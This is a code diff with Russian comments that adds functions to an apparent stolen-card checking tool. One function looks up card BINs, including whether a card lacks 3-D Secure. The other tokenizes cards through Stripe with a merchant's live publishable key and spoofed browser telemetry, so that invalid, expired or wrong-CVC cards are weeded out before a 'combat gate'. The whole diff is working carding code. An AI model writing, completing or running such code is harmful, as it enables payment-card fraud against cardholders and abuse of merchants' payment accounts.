@@ -102,6 +102,19 @@ def rand_str(k: int = 8, chars: str = string.ascii_lowercase + string.digits) ->
     return "".join(random.choices(chars, k=k))
 
 
+# country_name -> alpha2 для bins.antipublic.cc (6.3)
+_ANTIPUBLIC_A2 = {
+    "united states": "US", "canada": "CA", "united kingdom": "GB", "australia": "AU",
+    "germany": "DE", "france": "FR", "italy": "IT", "spain": "ES", "netherlands": "NL",
+    "sweden": "SE", "switzerland": "CH", "ireland": "IE", "new zealand": "NZ",
+    "brazil": "BR", "mexico": "MX", "india": "IN", "japan": "JP", "singapore": "SG",
+    "poland": "PL", "portugal": "PT", "belgium": "BE", "austria": "AT", "norway": "NO",
+    "denmark": "DK", "finland": "FI", "czech republic": "CZ", "romania": "RO",
+    "turkey": "TR", "israel": "IL", "south africa": "ZA", "qatar": "QA",
+    "united arab emirates": "AE", "saudi arabia": "SA", "hong kong": "HK",
+}
+
+
 def check_luhn(card_num: str) -> bool:
     digits = [int(d) for d in card_num if d.isdigit()]
     checksum = 0
@@ -786,6 +799,82 @@ def bin_alpha2(binfo: dict) -> str:
                         str(c["numeric"]).zfill(3), "")
         return str(a2).upper()[:2]
     return ""
+
+
+async def bin_lookup_enriched(bin6: str) -> dict:
+    """6.3: все три источника, мерж; is_vbv для non-VBV детекта.
+    antipublic первым (отдаёт level/vbv), binlist+handyapi добивают поля."""
+    from curl_cffi.requests import AsyncSession
+    merged: dict = {"scheme": None, "type": None, "bank": {"name": None},
+                    "country": {}, "level": None, "is_vbv": None, "_src": []}
+    async with AsyncSession(impersonate="chrome131", verify=False) as s:
+        for url, headers in (
+            (f"https://bins.antipublic.cc/bins/{bin6}", {}),
+            (f"https://lookup.binlist.net/{bin6}", {"Accept-Version": "3"}),
+            (f"https://data.handyapi.com/bin/{bin6}", {}),
+        ):
+            try:
+                r = await s.get(url, headers=headers, timeout=6)
+                if r.status_code != 200:
+                    continue
+                d = r.json()
+            except Exception:
+                continue
+            merged["_src"].append(url.split("/")[2])
+            if "antipublic" in url:
+                c_name = str(d.get("country_name", "")).lower()
+                a2 = _ANTIPUBLIC_A2.get(c_name, "")
+                merged.update({"scheme": d.get("brand"), "type": d.get("type"),
+                               "level": d.get("level"),
+                               "bank": {"name": d.get("bank")},
+                               "country": {"alpha2": a2, "name": d.get("country_name")}})
+                vbv_raw = str(d.get("vbv", "") or "").strip().lower()
+                if vbv_raw:
+                    merged["is_vbv"] = vbv_raw not in ("0", "false", "not_enrolled", "no")
+            elif "binlist" in url:
+                merged["scheme"] = merged.get("scheme") or d.get("scheme")
+                merged["type"] = merged.get("type") or d.get("type")
+                if d.get("country") and not merged["country"].get("alpha2"):
+                    merged["country"]["alpha2"] = d["country"].get("alpha2")
+                if d.get("bank") and not merged["bank"].get("name"):
+                    merged["bank"] = d.get("bank")
+            else:  # handyapi
+                merged["scheme"] = merged.get("scheme") or d.get("scheme")
+                merged["type"] = merged.get("type") or d.get("type")
+    # эвристика: premium/бизнес уровни чаще enrolled — но без данных источника
+    # честно оставляем None (unknown)
+    return merged
+
+
+async def token_only_check(s, pk: str, card_raw: str, referrer: str,
+                           telem: dict | None = None) -> dict:
+    """2.6: токенизация без confirm — cvc_check за $0. Отбраковка синтаксики
+    и мёртвых карт до боевого гейта. Возвращает {status, detail}."""
+    if not pk.startswith("pk_live"):
+        return {"status": "ERROR", "detail": "prefilter pk missing"}
+    card = parse_card(card_raw)
+    telem = telem or stripe_telemetry(referrer, pk)
+    tok_body = tokenize_body(card, telem, referrer)
+    try:
+        r = await s.post("https://api.stripe.com/v1/payment_methods",
+                         data=tok_body, headers=TOKENIZE_HEADERS, timeout=8)
+        d = r.json()
+    except Exception as e:
+        return {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
+    if "id" in d:
+        return {"status": "OK", "detail": f"token {d['id'][:18]}..."}
+    err = d.get("error", {})
+    code = str(err.get("code", ""))
+    msg = str(err.get("message", ""))[:150]
+    if code == "incorrect_cvc":
+        return {"status": "WRONG_CVC", "detail": msg}
+    if code in ("invalid_number", "incorrect_number"):
+        return {"status": "INVALID", "detail": msg}
+    if "expired" in msg.lower():
+        return {"status": "EXPIRED", "detail": msg}
+    if "api key" in msg.lower():
+        return {"status": "RESTRICTED", "detail": msg}
+    return {"status": classify_verdict(msg + code), "detail": msg}
 
 
 async def store_api_confirm(s, root: str, pk: str, card_raw: str,
